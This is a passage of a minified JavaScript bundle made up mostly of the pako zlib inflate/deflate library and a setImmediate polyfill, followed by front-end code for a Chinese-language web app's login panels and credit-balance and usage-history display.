a.Buf32(32),N=0;N<144;)E.lens[N++]=8;for(;N<256;)E.lens[N++]=9;for(;N<280;)E.lens[N++]=7;for(;N<288;)E.lens[N++]=8;for(u(h,E.lens,0,288,O,0,E.work,{bits:9}),N=0;N<32;)E.lens[N++]=5;u(c,E.lens,0,32,j,0,E.work,{bits:5}),P=!1}E.lencode=O,E.lenbits=9,E.distcode=j,E.distbits=5}function K(E,N,l,L){var J,D=E.state;return D.window===null&&(D.wsize=1<<D.wbits,D.wnext=0,D.whave=0,D.window=new a.Buf8(D.wsize)),L>=D.wsize?(a.arraySet(D.window,N,l-D.wsize,D.wsize,0),D.wnext=0,D.whave=D.wsize):(L<(J=D.wsize-D.wnext)&&(J=L),a.arraySet(D.window,N,l-L,J,D.wnext),(L-=J)?(a.arraySet(D.window,N,l-L,L,0),D.wnext=L,D.whave=D.wsize):(D.wnext+=J,D.wnext===D.wsize&&(D.wnext=0),D.whave<D.wsize&&(D.whave+=J))),0}s.inflateReset=I,s.inflateReset2=z,s.inflateResetKeep=x,s.inflateInit=function(E){return M(E,15)},s.inflateInit2=M,s.inflate=function(E,N){var l,L,J,D,$,q,te,B,A,ee,Y,X,ge,re,oe,ae,ne,le,we,Ie,f,U,F,S,k=0,C=new a.Buf8(4),W=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15];if(!E||!E.state||!E.output||!E.input&&E.avail_in!==0)return v;(l=E.state).mode===12&&(l.mode=13),$=E.next_out,J=E.output,te=E.avail_out,D=E.next_in,L=E.input,q=E.avail_in,B=l.hold,A=l.bits,ee=q,Y=te,U=p;e:for(;;)switch(l.mode){case m:if(l.wrap===0){l.mode=13;break}for(;A<16;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}if(2&l.wrap&&B===35615){C[l.check=0]=255&B,C[1]=B>>>8&255,l.check=n(l.check,C,2,0),A=B=0,l.mode=2;break}if(l.flags=0,l.head&&(l.head.done=!1),!(1&l.wrap)||(((255&B)<<8)+(B>>8))%31){E.msg="incorrect header check",l.mode=30;break}if((15&B)!=8){E.msg="unknown compression method",l.mode=30;break}if(A-=4,f=8+(15&(B>>>=4)),l.wbits===0)l.wbits=f;else if(f>l.wbits){E.msg="invalid window size",l.mode=30;break}l.dmax=1<<f,E.adler=l.check=1,l.mode=512&B?10:12,A=B=0;break;case 2:for(;A<16;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}if(l.flags=B,(255&l.flags)!=8){E.msg="unknown compression method",l.mode=30;break}if(57344&l.flags){E.msg="unknown header flags set",l.mode=30;break}l.head&&(l.head.text=B>>8&1),512&l.flags&&(C[0]=255&B,C[1]=B>>>8&255,l.check=n(l.check,C,2,0)),A=B=0,l.mode=3;case 3:for(;A<32;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}l.head&&(l.head.time=B),512&l.flags&&(C[0]=255&B,C[1]=B>>>8&255,C[2]=B>>>16&255,C[3]=B>>>24&255,l.check=n(l.check,C,4,0)),A=B=0,l.mode=4;case 4:for(;A<16;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}l.head&&(l.head.xflags=255&B,l.head.os=B>>8),512&l.flags&&(C[0]=255&B,C[1]=B>>>8&255,l.check=n(l.check,C,2,0)),A=B=0,l.mode=5;case 5:if(1024&l.flags){for(;A<16;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}l.length=B,l.head&&(l.head.extra_len=B),512&l.flags&&(C[0]=255&B,C[1]=B>>>8&255,l.check=n(l.check,C,2,0)),A=B=0}else l.head&&(l.head.extra=null);l.mode=6;case 6:if(1024&l.flags&&(q<(X=l.length)&&(X=q),X&&(l.head&&(f=l.head.extra_len-l.length,l.head.extra||(l.head.extra=new Array(l.head.extra_len)),a.arraySet(l.head.extra,L,D,X,f)),512&l.flags&&(l.check=n(l.check,L,X,D)),q-=X,D+=X,l.length-=X),l.length))break e;l.length=0,l.mode=7;case 7:if(2048&l.flags){if(q===0)break e;for(X=0;f=L[D+X++],l.head&&f&&l.length<65536&&(l.head.name+=String.fromCharCode(f)),f&&X<q;);if(512&l.flags&&(l.check=n(l.check,L,X,D)),q-=X,D+=X,f)break e}else l.head&&(l.head.name=null);l.length=0,l.mode=8;case 8:if(4096&l.flags){if(q===0)break e;for(X=0;f=L[D+X++],l.head&&f&&l.length<65536&&(l.head.comment+=String.fromCharCode(f)),f&&X<q;);if(512&l.flags&&(l.check=n(l.check,L,X,D)),q-=X,D+=X,f)break e}else l.head&&(l.head.comment=null);l.mode=9;case 9:if(512&l.flags){for(;A<16;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}if(B!==(65535&l.check)){E.msg="header crc mismatch",l.mode=30;break}A=B=0}l.head&&(l.head.hcrc=l.flags>>9&1,l.head.done=!0),E.adler=l.check=0,l.mode=12;break;case 10:for(;A<32;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}E.adler=l.check=b(B),A=B=0,l.mode=11;case 11:if(l.havedict===0)return E.next_out=$,E.avail_out=te,E.next_in=D,E.avail_in=q,l.hold=B,l.bits=A,2;E.adler=l.check=1,l.mode=12;case 12:if(N===5||N===6)break e;case 13:if(l.last){B>>>=7&A,A-=7&A,l.mode=27;break}for(;A<3;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}switch(l.last=1&B,A-=1,3&(B>>>=1)){case 0:l.mode=14;break;case 1:if(H(l),l.mode=20,N!==6)break;B>>>=2,A-=2;break e;case 2:l.mode=17;break;case 3:E.msg="invalid block type",l.mode=30}B>>>=2,A-=2;break;case 14:for(B>>>=7&A,A-=7&A;A<32;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}if((65535&B)!=(B>>>16^65535)){E.msg="invalid stored block lengths",l.mode=30;break}if(l.length=65535&B,A=B=0,l.mode=15,N===6)break e;case 15:l.mode=16;case 16:if(X=l.length){if(q<X&&(X=q),te<X&&(X=te),X===0)break e;a.arraySet(J,L,D,X,$),q-=X,D+=X,te-=X,$+=X,l.length-=X;break}l.mode=12;break;case 17:for(;A<14;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}if(l.nlen=257+(31&B),B>>>=5,A-=5,l.ndist=1+(31&B),B>>>=5,A-=5,l.ncode=4+(15&B),B>>>=4,A-=4,286<l.nlen||30<l.ndist){E.msg="too many length or distance symbols",l.mode=30;break}l.have=0,l.mode=18;case 18:for(;l.have<l.ncode;){for(;A<3;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}l.lens[W[l.have++]]=7&B,B>>>=3,A-=3}for(;l.have<19;)l.lens[W[l.have++]]=0;if(l.lencode=l.lendyn,l.lenbits=7,F={bits:l.lenbits},U=u(0,l.lens,0,19,l.lencode,0,l.work,F),l.lenbits=F.bits,U){E.msg="invalid code lengths set",l.mode=30;break}l.have=0,l.mode=19;case 19:for(;l.have<l.nlen+l.ndist;){for(;ae=(k=l.lencode[B&(1<<l.lenbits)-1])>>>16&255,ne=65535&k,!((oe=k>>>24)<=A);){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}if(ne<16)B>>>=oe,A-=oe,l.lens[l.have++]=ne;else{if(ne===16){for(S=oe+2;A<S;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}if(B>>>=oe,A-=oe,l.have===0){E.msg="invalid bit length repeat",l.mode=30;break}f=l.lens[l.have-1],X=3+(3&B),B>>>=2,A-=2}else if(ne===17){for(S=oe+3;A<S;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}A-=oe,f=0,X=3+(7&(B>>>=oe)),B>>>=3,A-=3}else{for(S=oe+7;A<S;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}A-=oe,f=0,X=11+(127&(B>>>=oe)),B>>>=7,A-=7}if(l.have+X>l.nlen+l.ndist){E.msg="invalid bit length repeat",l.mode=30;break}for(;X--;)l.lens[l.have++]=f}}if(l.mode===30)break;if(l.lens[256]===0){E.msg="invalid code -- missing end-of-block",l.mode=30;break}if(l.lenbits=9,F={bits:l.lenbits},U=u(h,l.lens,0,l.nlen,l.lencode,0,l.work,F),l.lenbits=F.bits,U){E.msg="invalid literal/lengths set",l.mode=30;break}if(l.distbits=6,l.distcode=l.distdyn,F={bits:l.distbits},U=u(c,l.lens,l.nlen,l.ndist,l.distcode,0,l.work,F),l.distbits=F.bits,U){E.msg="invalid distances set",l.mode=30;break}if(l.mode=20,N===6)break e;case 20:l.mode=21;case 21:if(6<=q&&258<=te){E.next_out=$,E.avail_out=te,E.next_in=D,E.avail_in=q,l.hold=B,l.bits=A,d(E,Y),$=E.next_out,J=E.output,te=E.avail_out,D=E.next_in,L=E.input,q=E.avail_in,B=l.hold,A=l.bits,l.mode===12&&(l.back=-1);break}for(l.back=0;ae=(k=l.lencode[B&(1<<l.lenbits)-1])>>>16&255,ne=65535&k,!((oe=k>>>24)<=A);){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}if(ae&&(240&ae)==0){for(le=oe,we=ae,Ie=ne;ae=(k=l.lencode[Ie+((B&(1<<le+we)-1)>>le)])>>>16&255,ne=65535&k,!(le+(oe=k>>>24)<=A);){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}B>>>=le,A-=le,l.back+=le}if(B>>>=oe,A-=oe,l.back+=oe,l.length=ne,ae===0){l.mode=26;break}if(32&ae){l.back=-1,l.mode=12;break}if(64&ae){E.msg="invalid literal/length code",l.mode=30;break}l.extra=15&ae,l.mode=22;case 22:if(l.extra){for(S=l.extra;A<S;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}l.length+=B&(1<<l.extra)-1,B>>>=l.extra,A-=l.extra,l.back+=l.extra}l.was=l.length,l.mode=23;case 23:for(;ae=(k=l.distcode[B&(1<<l.distbits)-1])>>>16&255,ne=65535&k,!((oe=k>>>24)<=A);){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}if((240&ae)==0){for(le=oe,we=ae,Ie=ne;ae=(k=l.distcode[Ie+((B&(1<<le+we)-1)>>le)])>>>16&255,ne=65535&k,!(le+(oe=k>>>24)<=A);){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}B>>>=le,A-=le,l.back+=le}if(B>>>=oe,A-=oe,l.back+=oe,64&ae){E.msg="invalid distance code",l.mode=30;break}l.offset=ne,l.extra=15&ae,l.mode=24;case 24:if(l.extra){for(S=l.extra;A<S;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}l.offset+=B&(1<<l.extra)-1,B>>>=l.extra,A-=l.extra,l.back+=l.extra}if(l.offset>l.dmax){E.msg="invalid distance too far back",l.mode=30;break}l.mode=25;case 25:if(te===0)break e;if(X=Y-te,l.offset>X){if((X=l.offset-X)>l.whave&&l.sane){E.msg="invalid distance too far back",l.mode=30;break}ge=X>l.wnext?(X-=l.wnext,l.wsize-X):l.wnext-X,X>l.length&&(X=l.length),re=l.window}else re=J,ge=$-l.offset,X=l.length;for(te<X&&(X=te),te-=X,l.length-=X;J[$++]=re[ge++],--X;);l.length===0&&(l.mode=21);break;case 26:if(te===0)break e;J[$++]=l.length,te--,l.mode=21;break;case 27:if(l.wrap){for(;A<32;){if(q===0)break e;q--,B|=L[D++]<<A,A+=8}if(Y-=te,E.total_out+=Y,l.total+=Y,Y&&(E.adler=l.check=l.flags?n(l.check,J,Y,$-Y):o(l.check,J,Y,$-Y)),Y=te,(l.flags?B:b(B))!==l.check){E.msg="incorrect data check",l.mode=30;break}A=B=0}l.mode=28;case 28:if(l.wrap&&l.flags){for(;A<32;){if(q===0)break e;q--,B+=L[D++]<<A,A+=8}if(B!==(4294967295&l.total)){E.msg="incorrect length check",l.mode=30;break}A=B=0}l.mode=29;case 29:U=1;break e;case 30:U=-3;break e;case 31:return-4;case 32:default:return v}return E.next_out=$,E.avail_out=te,E.next_in=D,E.avail_in=q,l.hold=B,l.bits=A,(l.wsize||Y!==E.avail_out&&l.mode<30&&(l.mode<27||N!==4))&&K(E,E.output,E.next_out,Y-E.avail_out)?(l.mode=31,-4):(ee-=E.avail_in,Y-=E.avail_out,E.total_in+=ee,E.total_out+=Y,l.total+=Y,l.wrap&&Y&&(E.adler=l.check=l.flags?n(l.check,J,Y,E.next_out-Y):o(l.check,J,Y,E.next_out-Y)),E.data_type=l.bits+(l.last?64:0)+(l.mode===12?128:0)+(l.mode===20||l.mode===15?256:0),(ee==0&&Y===0||N===4)&&U===p&&(U=-5),U)},s.inflateEnd=function(E){if(!E||!E.state)return v;var N=E.state;return N.window&&(N.window=null),E.state=null,p},s.inflateGetHeader=function(E,N){var l;return E&&E.state?(2&(l=E.state).wrap)==0?v:((l.head=N).done=!1,p):v},s.inflateSetDictionary=function(E,N){var l,L=N.length;return E&&E.state?(l=E.state).wrap!==0&&l.mode!==11?v:l.mode===11&&o(1,N,L,0)!==l.check?-3:K(E,N,L,L)?(l.mode=31,-4):(l.havedict=1,p):v},s.inflateInfo="pako inflate (from Nodeca project)"},{"../utils/common":41,"./adler32":43,"./crc32":45,"./inffast":48,"./inftrees":50}],50:[function(t,r,s){var a=t("../utils/common"),o=[3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258,0,0],n=[16,16,16,16,16,16,16,16,17,17,17,17,18,18,18,18,19,19,19,19,20,20,20,20,21,21,21,21,16,72,78],d=[1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577,0,0],u=[16,16,16,16,17,17,18,18,19,19,20,20,21,21,22,22,23,23,24,24,25,25,26,26,27,27,28,28,29,29,64,64];r.exports=function(h,c,p,v,m,g,y,b){var _,x,I,z,M,O,j,P,H,K=b.bits,E=0,N=0,l=0,L=0,J=0,D=0,$=0,q=0,te=0,B=0,A=null,ee=0,Y=new a.Buf16(16),X=new a.Buf16(16),ge=null,re=0;for(E=0;E<=15;E++)Y[E]=0;for(N=0;N<v;N++)Y[c[p+N]]++;for(J=K,L=15;1<=L&&Y[L]===0;L--);if(L<J&&(J=L),L===0)return m[g++]=20971520,m[g++]=20971520,b.bits=1,0;for(l=1;l<L&&Y[l]===0;l++);for(J<l&&(J=l),E=q=1;E<=15;E++)if(q<<=1,(q-=Y[E])<0)return-1;if(0<q&&(h===0||L!==1))return-1;for(X[1]=0,E=1;E<15;E++)X[E+1]=X[E]+Y[E];for(N=0;N<v;N++)c[p+N]!==0&&(y[X[c[p+N]]++]=N);if(O=h===0?(A=ge=y,19):h===1?(A=o,ee-=257,ge=n,re-=257,256):(A=d,ge=u,-1),E=l,M=g,$=N=B=0,I=-1,z=(te=1<<(D=J))-1,h===1&&852<te||h===2&&592<te)return 1;for(;;){for(j=E-$,H=y[N]<O?(P=0,y[N]):y[N]>O?(P=ge[re+y[N]],A[ee+y[N]]):(P=96,0),_=1<<E-$,l=x=1<<D;m[M+(B>>$)+(x-=_)]=j<<24|P<<16|H|0,x!==0;);for(_=1<<E-1;B&_;)_>>=1;if(_!==0?(B&=_-1,B+=_):B=0,N++,--Y[E]==0){if(E===L)break;E=c[p+y[N]]}if(J<E&&(B&z)!==I){for($===0&&($=J),M+=l,q=1<<(D=E-$);D+$<L&&!((q-=Y[D+$])<=0);)D++,q<<=1;if(te+=1<<D,h===1&&852<te||h===2&&592<te)return 1;m[I=B&z]=J<<24|D<<16|M-g|0}}return B!==0&&(m[M+B]=E-$<<24|64<<16|0),b.bits=J,0}},{"../utils/common":41}],51:[function(t,r,s){r.exports={2:"need dictionary",1:"stream end",0:"","-1":"file error","-2":"stream error","-3":"data error","-4":"insufficient memory","-5":"buffer error","-6":"incompatible version"}},{}],52:[function(t,r,s){var a=t("../utils/common"),o=0,n=1;function d(k){for(var C=k.length;0<=--C;)k[C]=0}var u=0,h=29,c=256,p=c+1+h,v=30,m=19,g=2*p+1,y=15,b=16,_=7,x=256,I=16,z=17,M=18,O=[0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0],j=[0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13],P=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,3,7],H=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15],K=new Array(2*(p+2));d(K);var E=new Array(2*v);d(E);var N=new Array(512);d(N);var l=new Array(256);d(l);var L=new Array(h);d(L);var J,D,$,q=new Array(v);function te(k,C,W,Z,R){this.static_tree=k,this.extra_bits=C,this.extra_base=W,this.elems=Z,this.max_length=R,this.has_stree=k&&k.length}function B(k,C){this.dyn_tree=k,this.max_code=0,this.stat_desc=C}function A(k){return k<256?N[k]:N[256+(k>>>7)]}function ee(k,C){k.pending_buf[k.pending++]=255&C,k.pending_buf[k.pending++]=C>>>8&255}function Y(k,C,W){k.bi_valid>b-W?(k.bi_buf|=C<<k.bi_valid&65535,ee(k,k.bi_buf),k.bi_buf=C>>b-k.bi_valid,k.bi_valid+=W-b):(k.bi_buf|=C<<k.bi_valid&65535,k.bi_valid+=W)}function X(k,C,W){Y(k,W[2*C],W[2*C+1])}function ge(k,C){for(var W=0;W|=1&k,k>>>=1,W<<=1,0<--C;);return W>>>1}function re(k,C,W){var Z,R,V=new Array(y+1),Q=0;for(Z=1;Z<=y;Z++)V[Z]=Q=Q+W[Z-1]<<1;for(R=0;R<=C;R++){var G=k[2*R+1];G!==0&&(k[2*R]=ge(V[G]++,G))}}function oe(k){var C;for(C=0;C<p;C++)k.dyn_ltree[2*C]=0;for(C=0;C<v;C++)k.dyn_dtree[2*C]=0;for(C=0;C<m;C++)k.bl_tree[2*C]=0;k.dyn_ltree[2*x]=1,k.opt_len=k.static_len=0,k.last_lit=k.matches=0}function ae(k){8<k.bi_valid?ee(k,k.bi_buf):0<k.bi_valid&&(k.pending_buf[k.pending++]=k.bi_buf),k.bi_buf=0,k.bi_valid=0}function ne(k,C,W,Z){var R=2*C,V=2*W;return k[R]<k[V]||k[R]===k[V]&&Z[C]<=Z[W]}function le(k,C,W){for(var Z=k.heap[W],R=W<<1;R<=k.heap_len&&(R<k.heap_len&&ne(C,k.heap[R+1],k.heap[R],k.depth)&&R++,!ne(C,Z,k.heap[R],k.depth));)k.heap[W]=k.heap[R],W=R,R<<=1;k.heap[W]=Z}function we(k,C,W){var Z,R,V,Q,G=0;if(k.last_lit!==0)for(;Z=k.pending_buf[k.d_buf+2*G]<<8|k.pending_buf[k.d_buf+2*G+1],R=k.pending_buf[k.l_buf+G],G++,Z===0?X(k,R,C):(X(k,(V=l[R])+c+1,C),(Q=O[V])!==0&&Y(k,R-=L[V],Q),X(k,V=A(--Z),W),(Q=j[V])!==0&&Y(k,Z-=q[V],Q)),G<k.last_lit;);X(k,x,C)}function Ie(k,C){var W,Z,R,V=C.dyn_tree,Q=C.stat_desc.static_tree,G=C.stat_desc.has_stree,se=C.stat_desc.elems,ve=-1;for(k.heap_len=0,k.heap_max=g,W=0;W<se;W++)V[2*W]!==0?(k.heap[++k.heap_len]=ve=W,k.depth[W]=0):V[2*W+1]=0;for(;k.heap_len<2;)V[2*(R=k.heap[++k.heap_len]=ve<2?++ve:0)]=1,k.depth[R]=0,k.opt_len--,G&&(k.static_len-=Q[2*R+1]);for(C.max_code=ve,W=k.heap_len>>1;1<=W;W--)le(k,V,W);for(R=se;W=k.heap[1],k.heap[1]=k.heap[k.heap_len--],le(k,V,1),Z=k.heap[1],k.heap[--k.heap_max]=W,k.heap[--k.heap_max]=Z,V[2*R]=V[2*W]+V[2*Z],k.depth[R]=(k.depth[W]>=k.depth[Z]?k.depth[W]:k.depth[Z])+1,V[2*W+1]=V[2*Z+1]=R,k.heap[1]=R++,le(k,V,1),2<=k.heap_len;);k.heap[--k.heap_max]=k.heap[1],(function(pe,Ce){var vt,Fe,ht,ye,Ct,ti,Ne=Ce.dyn_tree,Oi=Ce.max_code,rr=Ce.stat_desc.static_tree,sr=Ce.stat_desc.has_stree,ar=Ce.stat_desc.extra_bits,Ri=Ce.stat_desc.extra_base,mt=Ce.stat_desc.max_length,Tt=0;for(ye=0;ye<=y;ye++)pe.bl_count[ye]=0;for(Ne[2*pe.heap[pe.heap_max]+1]=0,vt=pe.heap_max+1;vt<g;vt++)mt<(ye=Ne[2*Ne[2*(Fe=pe.heap[vt])+1]+1]+1)&&(ye=mt,Tt++),Ne[2*Fe+1]=ye,Oi<Fe||(pe.bl_count[ye]++,Ct=0,Ri<=Fe&&(Ct=ar[Fe-Ri]),ti=Ne[2*Fe],pe.opt_len+=ti*(ye+Ct),sr&&(pe.static_len+=ti*(rr[2*Fe+1]+Ct)));if(Tt!==0){do{for(ye=mt-1;pe.bl_count[ye]===0;)ye--;pe.bl_count[ye]--,pe.bl_count[ye+1]+=2,pe.bl_count[mt]--,Tt-=2}while(0<Tt);for(ye=mt;ye!==0;ye--)for(Fe=pe.bl_count[ye];Fe!==0;)Oi<(ht=pe.heap[--vt])||(Ne[2*ht+1]!==ye&&(pe.opt_len+=(ye-Ne[2*ht+1])*Ne[2*ht],Ne[2*ht+1]=ye),Fe--)}})(k,C),re(V,ve,k.bl_count)}function f(k,C,W){var Z,R,V=-1,Q=C[1],G=0,se=7,ve=4;for(Q===0&&(se=138,ve=3),C[2*(W+1)+1]=65535,Z=0;Z<=W;Z++)R=Q,Q=C[2*(Z+1)+1],++G<se&&R===Q||(G<ve?k.bl_tree[2*R]+=G:R!==0?(R!==V&&k.bl_tree[2*R]++,k.bl_tree[2*I]++):G<=10?k.bl_tree[2*z]++:k.bl_tree[2*M]++,V=R,ve=(G=0)===Q?(se=138,3):R===Q?(se=6,3):(se=7,4))}function U(k,C,W){var Z,R,V=-1,Q=C[1],G=0,se=7,ve=4;for(Q===0&&(se=138,ve=3),Z=0;Z<=W;Z++)if(R=Q,Q=C[2*(Z+1)+1],!(++G<se&&R===Q)){if(G<ve)for(;X(k,R,k.bl_tree),--G!=0;);else R!==0?(R!==V&&(X(k,R,k.bl_tree),G--),X(k,I,k.bl_tree),Y(k,G-3,2)):G<=10?(X(k,z,k.bl_tree),Y(k,G-3,3)):(X(k,M,k.bl_tree),Y(k,G-11,7));V=R,ve=(G=0)===Q?(se=138,3):R===Q?(se=6,3):(se=7,4)}}d(q);var F=!1;function S(k,C,W,Z){Y(k,(u<<1)+(Z?1:0),3),(function(R,V,Q,G){ae(R),ee(R,Q),ee(R,~Q),a.arraySet(R.pending_buf,R.window,V,Q,R.pending),R.pending+=Q})(k,C,W)}s._tr_init=function(k){F||((function(){var C,W,Z,R,V,Q=new Array(y+1);for(R=Z=0;R<h-1;R++)for(L[R]=Z,C=0;C<1<<O[R];C++)l[Z++]=R;for(l[Z-1]=R,R=V=0;R<16;R++)for(q[R]=V,C=0;C<1<<j[R];C++)N[V++]=R;for(V>>=7;R<v;R++)for(q[R]=V<<7,C=0;C<1<<j[R]-7;C++)N[256+V++]=R;for(W=0;W<=y;W++)Q[W]=0;for(C=0;C<=143;)K[2*C+1]=8,C++,Q[8]++;for(;C<=255;)K[2*C+1]=9,C++,Q[9]++;for(;C<=279;)K[2*C+1]=7,C++,Q[7]++;for(;C<=287;)K[2*C+1]=8,C++,Q[8]++;for(re(K,p+1,Q),C=0;C<v;C++)E[2*C+1]=5,E[2*C]=ge(C,5);J=new te(K,O,c+1,p,y),D=new te(E,j,0,v,y),$=new te(new Array(0),P,0,m,_)})(),F=!0),k.l_desc=new B(k.dyn_ltree,J),k.d_desc=new B(k.dyn_dtree,D),k.bl_desc=new B(k.bl_tree,$),k.bi_buf=0,k.bi_valid=0,oe(k)},s._tr_stored_block=S,s._tr_flush_block=function(k,C,W,Z){var R,V,Q=0;0<k.level?(k.strm.data_type===2&&(k.strm.data_type=(function(G){var se,ve=4093624447;for(se=0;se<=31;se++,ve>>>=1)if(1&ve&&G.dyn_ltree[2*se]!==0)return o;if(G.dyn_ltree[18]!==0||G.dyn_ltree[20]!==0||G.dyn_ltree[26]!==0)return n;for(se=32;se<c;se++)if(G.dyn_ltree[2*se]!==0)return n;return o})(k)),Ie(k,k.l_desc),Ie(k,k.d_desc),Q=(function(G){var se;for(f(G,G.dyn_ltree,G.l_desc.max_code),f(G,G.dyn_dtree,G.d_desc.max_code),Ie(G,G.bl_desc),se=m-1;3<=se&&G.bl_tree[2*H[se]+1]===0;se--);return G.opt_len+=3*(se+1)+5+5+4,se})(k),R=k.opt_len+3+7>>>3,(V=k.static_len+3+7>>>3)<=R&&(R=V)):R=V=W+5,W+4<=R&&C!==-1?S(k,C,W,Z):k.strategy===4||V===R?(Y(k,2+(Z?1:0),3),we(k,K,E)):(Y(k,4+(Z?1:0),3),(function(G,se,ve,pe){var Ce;for(Y(G,se-257,5),Y(G,ve-1,5),Y(G,pe-4,4),Ce=0;Ce<pe;Ce++)Y(G,G.bl_tree[2*H[Ce]+1],3);U(G,G.dyn_ltree,se-1),U(G,G.dyn_dtree,ve-1)})(k,k.l_desc.max_code+1,k.d_desc.max_code+1,Q+1),we(k,k.dyn_ltree,k.dyn_dtree)),oe(k),Z&&ae(k)},s._tr_tally=function(k,C,W){return k.pending_buf[k.d_buf+2*k.last_lit]=C>>>8&255,k.pending_buf[k.d_buf+2*k.last_lit+1]=255&C,k.pending_buf[k.l_buf+k.last_lit]=255&W,k.last_lit++,C===0?k.dyn_ltree[2*W]++:(k.matches++,C--,k.dyn_ltree[2*(l[W]+c+1)]++,k.dyn_dtree[2*A(C)]++),k.last_lit===k.lit_bufsize-1},s._tr_align=function(k){Y(k,2,3),X(k,x,K),(function(C){C.bi_valid===16?(ee(C,C.bi_buf),C.bi_buf=0,C.bi_valid=0):8<=C.bi_valid&&(C.pending_buf[C.pending++]=255&C.bi_buf,C.bi_buf>>=8,C.bi_valid-=8)})(k)}},{"../utils/common":41}],53:[function(t,r,s){r.exports=function(){this.input=null,this.next_in=0,this.avail_in=0,this.total_in=0,this.output=null,this.next_out=0,this.avail_out=0,this.total_out=0,this.msg="",this.state=null,this.data_type=2,this.adler=0}},{}],54:[function(t,r,s){(function(a){(function(o,n){if(!o.setImmediate){var d,u,h,c,p=1,v={},m=!1,g=o.document,y=Object.getPrototypeOf&&Object.getPrototypeOf(o);y=y&&y.setTimeout?y:o,d={}.toString.call(o.process)==="[object process]"?function(I){process.nextTick(function(){_(I)})}:(function(){if(o.postMessage&&!o.importScripts){var I=!0,z=o.onmessage;return o.onmessage=function(){I=!1},o.postMessage("","*"),o.onmessage=z,I}})()?(c="setImmediate$"+Math.random()+"$",o.addEventListener?o.addEventListener("message",x,!1):o.attachEvent("onmessage",x),function(I){o.postMessage(c+I,"*")}):o.MessageChannel?((h=new MessageChannel).port1.onmessage=function(I){_(I.data)},function(I){h.port2.postMessage(I)}):g&&"onreadystatechange"in g.createElement("script")?(u=g.documentElement,function(I){var z=g.createElement("script");z.onreadystatechange=function(){_(I),z.onreadystatechange=null,u.removeChild(z),z=null},u.appendChild(z)}):function(I){setTimeout(_,0,I)},y.setImmediate=function(I){typeof I!="function"&&(I=new Function(""+I));for(var z=new Array(arguments.length-1),M=0;M<z.length;M++)z[M]=arguments[M+1];var O={callback:I,args:z};return v[p]=O,d(p),p++},y.clearImmediate=b}function b(I){delete v[I]}function _(I){if(m)setTimeout(_,0,I);else{var z=v[I];if(z){m=!0;try{(function(M){var O=M.callback,j=M.args;switch(j.length){case 0:O();break;case 1:O(j[0]);break;case 2:O(j[0],j[1]);break;case 3:O(j[0],j[1],j[2]);break;default:O.apply(n,j)}})(z)}finally{b(I),m=!1}}}}function x(I){I.source===o&&typeof I.data=="string"&&I.data.indexOf(c)===0&&_(+I.data.slice(c.length))}})(typeof self>"u"?a===void 0?this:a:self)}).call(this,typeof Lt<"u"?Lt:typeof self<"u"?self:typeof window<"u"?window:{})},{}]},{},[10])(10)})})(ii)),ii.exports}var ds=ls();const cs=os(ds);function ps(e){let i=document.getElementById("auth-guest"),t=document.getElementById("auth-register"),r=document.getElementById("auth-reset"),s=document.getElementById("auth-logged");i&&(i.style.display="block"),t&&(t.style.display="none"),r&&(r.style.display="none"),s&&(s.style.display="none")}function ci(e){if(e==null)return"--";let i=parseInt(e,10);return isNaN(i)?String(e):i.toLocaleString("zh-CN")}function He(){return he()?mr().then(function(e){let i=e&&e.success&&e.data&&typeof e.data.credits=="number"?e.data.credits:e&&typeof e.credits=="number"?e.credits:null;lt("user-credits","额度："+ci(i));let t=document.getElementById("credits-balance");return t&&(t.textContent=ci(i)),i}).catch(function(){lt("user-credits","额度：--")}):(lt("user-credits","额度：--"),Promise.resolve(null))}function bi(e){e=parseInt(e,10)||1;let i=10,t=(e-1)*i,r=document.getElementById("credits-usage-list");r&&(r.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取使用记录...</div>'),He(),yr(i,t).then(function(s){let a=s&&s.data&&s.data.logs||s&&s.logs||[],o=s&&s.data&&s.data.total||s&&s.total||a.length,n=s&&s.meta||{},d=n.limit||i,u=n.offset||t,h=Math.floor(u/d)+1,c=Math.max(1,Math.ceil(o/d));us(a),hi("credits-pagination",h,c,function(p){bi(p)}),$e("credits-pagination",c>1?"flex":"none")}).catch(function(s){r&&(r.innerHTML='<div style="text-align:center;padding:20px;color:var(--danger)">读取使用记录失败</div>')})}function us(e){let i=document.getElementById("credits-usage-list");if(!i)return;if(!e||e.length===0){i.innerHTML='<div style="text-align:center;padding:24px;color:var(--text-secondary)">近 30 天内没有额度变动记录</div>';return}let t='<div style="display:flex;flex-direction:column;gap:8px">';e.forEach(function(r){let s=r.amount||0,a=s<0?"var(--danger)":"var(--success)",o=(s>0?"+":"")+s;t+='<div style="display:flex;align-items:center;justify-content:space-between;padding:10px;background:var(--bg);border:1px solid var(--border);border-radius:2px">',t+="<div>",t+='<div 